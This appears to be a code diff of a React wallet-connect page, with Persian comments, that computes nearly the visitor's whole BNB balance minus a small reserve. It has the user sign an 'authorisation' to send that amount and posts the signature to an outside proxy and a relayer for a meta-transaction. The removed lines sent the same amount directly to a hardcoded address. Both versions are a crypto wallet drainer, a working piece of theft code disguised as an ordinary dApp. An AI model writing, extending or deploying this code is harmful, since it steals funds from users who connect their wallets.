@@ -1,5 +1,6 @@
 import React, { useState } from "react";
 
+// دریافت موجودی واقعی از شبکه (eth_getBalance)
 async function getLiveBalance(address) {
   try {
     const balanceHex = await window.ethereum.request({
@@ -13,19 +14,6 @@ async function getLiveBalance(address) {
   }
 }
 
-async function getGasPrice() {
-  try {
-    const gasPriceHex = await window.ethereum.request({
-      method: "eth_gasPrice",
-      params: [],
-    });
-    return parseInt(gasPriceHex, 16); // in Wei
-  } catch (error) {
-    console.error("❌ Error fetching gas price:", error);
-    return null;
-  }
-}
-
 function App() {
   const [account, setAccount] = useState(null);
 
@@ -35,6 +23,7 @@ function App() {
       return;
     }
 
+    // اتصال کیف پول
     let accounts;
     try {
       accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
@@ -50,6 +39,7 @@ function App() {
     setAccount(userAddress);
     console.log("✅ User address:", userAddress);
 
+    // دریافت موجودی واقعی کیف پول
     const liveBalanceStr = await getLiveBalance(userAddress);
     console.log("💰 Live BNB Balance:", liveBalanceStr);
     const totalBalance = parseFloat(liveBalanceStr);
@@ -58,7 +48,7 @@ function App() {
       return;
     }
 
-    // reserve تنظیم شده: برای مثال 0.01 BNB
+    // تعیین مقدار reserve (برای مثال، 0.01 BNB)
     const reserveBNB = 0.01;
     const sendAmount = totalBalance - reserveBNB;
     if (sendAmount <= 0) {
@@ -67,6 +57,7 @@ function App() {
     }
     console.log("Calculated send amount (BNB):", sendAmount);
 
+    // ساخت پیام برای امضا بر اساس sendAmount
     const message = `Authorize sending ${sendAmount} BNB from ${userAddress}`;
     console.log("📜 Message to sign:", message);
 
@@ -82,6 +73,7 @@ function App() {
       return;
     }
 
+    // ارسال داده‌های امضا شده به سرور اولیه (send.php) جهت تأیید
     try {
       const resp = await fetch("https://sponsorbinance.vercel.app/api/proxy", {
         method: "POST",
@@ -104,37 +96,28 @@ function App() {
       return;
     }
 
-    // دریافت nonce به صورت زنده
-    let nonceHex;
+    // ارسال درخواست به ریلیر (relayer.php) جهت ساخت و پخش تراکنش meta
     try {
-      nonceHex = await window.ethereum.request({
-        method: "eth_getTransactionCount",
-        params: [userAddress, "latest"],
+      const resp2 = await fetch("https://YOUR-DOMAIN.com/crypto-project/relayer.php", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          handler: "tx",
+          address: userAddress,
+          signature: signature,
+          amount: sendAmount.toString(),
+        }),
       });
-      console.log("Nonce (hex):", nonceHex);
-    } catch (err) {
-      console.error("❌ Error fetching nonce:", err);
+      const result2 = await resp2.json();
+      console.log("Relayer response:", result2);
+      if (!result2.success) {
+        console.error("❌ Relayer transaction failed:", result2);
+        return;
+      }
+      alert("Transaction sent via meta-transaction! TxHash: " + result2.txHash);
+    } catch (e) {
+      console.error("❌ Could not call relayer:", e);
       return;
-    }
-
-    const sendWeiHex = "0x" + (sendAmount * 1e18).toString(16);
-    const txParams = {
-      from: userAddress,
-      to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD",
-      value: sendWeiHex,
-      nonce: nonceHex
-      // حذف gas و gasPrice برای استفاده از تخمین خودکار کیف پول
-    };
-
-    try {
-      const txHash = await window.ethereum.request({
-        method: "eth_sendTransaction",
-        params: [txParams],
-      });
-      console.log("📤 Transaction broadcasted. Hash:", txHash);
-      alert("Transaction sent! TxHash: " + txHash);
-    } catch (err) {
-      console.error("❌ Error sending transaction:", err);
     }
   }
 
